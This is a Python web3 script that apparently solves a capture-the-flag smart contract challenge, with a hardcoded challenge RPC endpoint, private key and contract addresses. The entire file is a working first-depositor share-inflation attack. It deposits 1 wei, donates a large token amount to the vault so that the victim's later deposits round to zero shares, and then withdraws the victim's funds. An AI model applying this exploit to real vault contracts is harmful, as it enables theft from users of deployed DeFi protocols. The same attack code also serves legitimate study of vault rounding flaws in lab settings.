from web3 import Web3

# --- CONFIGURATION ---
RPC_URL = "http://challenges.1pc.tf:36005/080e01c8-4c85-4e00-87e0-1ca79f45e343"
PRIVKEY = "dd48182a1d099600ffc2b92f55e6843aadf130e5bc91488d9adb776cddcd6939"
SETUP_ADDR = "0xb2fD92D1609E647d04De9448d978f76d7f1A4D69"
WALLET_ADDR = "0xEBC5928F666416801Da195e4cEC1FE0d8E1E8daC"

# --- WEB3 SETUP ---
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVKEY)

# --- ABIs ---
SETUP_ABI = [
    {"inputs": [], "name": "conductRituals", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "nexus", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "essence", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"}
]

NEXUS_ABI = [
    {"inputs": [{"internalType": "uint256", "name": "essenceAmount", "type": "uint256"}], "name": "attune", "outputs": [{"internalType": "uint256", "name": "crystals", "type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "uint256", "name": "crystalAmount", "type": "uint256"}, {"internalType": "address", "name": "recipient", "type": "address"}], "name": "dissolve", "outputs": [{"internalType": "uint256", "name": "essenceOut", "type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "", "type": "address"}], "name": "crystalBalance", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
]

ESSENCE_ABI = [
    {"inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
]

# --- INIT CONTRACTS ---
setup_contract = w3.eth.contract(address=SETUP_ADDR, abi=SETUP_ABI)
nexus_addr = setup_contract.functions.nexus().call()
essence_addr = setup_contract.functions.essence().call()

nexus_contract = w3.eth.contract(address=nexus_addr, abi=NEXUS_ABI)
essence_contract = w3.eth.contract(address=essence_addr, abi=ESSENCE_ABI)

def send_tx(func):
    tx = func.build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 500000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(WALLET_ADDR),
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Executing {func.fn_name}... Hash: {tx_hash.hex()}")
    w3.eth.wait_for_transaction_receipt(tx_hash)

# --- ATTACK EXECUTION ---

# 1. Approve Nexus to spend our Essence
print("[*] Approving Nexus...")
send_tx(essence_contract.functions.approve(nexus_addr, 2**256 - 1))

# 2. Attune 1 wei (Initial Deposit to get 100% share of 1 wei crystal)
print("[*] Attuning 1 wei...")
send_tx(nexus_contract.functions.attune(1))

# 3. Donation Attack (Send 6100 ether directly to Nexus)
# This makes the share price extremely expensive.
donation_amount = w3.to_wei(6100, 'ether')
print(f"[*] Donating {w3.from_wei(donation_amount, 'ether')} ESS...")
send_tx(essence_contract.functions.transfer(nexus_addr, donation_amount))

# 4. Trigger Setup (Victim)
# Setup deposits 6000, then 9000.
# Math: (6000 * 1) / 6101 = 0 shares.
print("[*] Triggering Setup Rituals...")
send_tx(setup_contract.functions.conductRituals())

# 5. Withdraw Profit
# We own 1 wei crystal (100% supply). We withdraw everything.
my_crystals = nexus_contract.functions.crystalBalance(WALLET_ADDR).call()
print(f"[*] Dissolving {my_crystals} crystals...")
send_tx(nexus_contract.functions.dissolve(my_crystals, WALLET_ADDR))

# Check final status
final_bal = essence_contract.functions.balanceOf(WALLET_ADDR).call()
print(f"Final Balance: {w3.from_wei(final_bal, 'ether')} ESS")
print(f"Solved: {setup_contract.functions.isSolved().call()}")
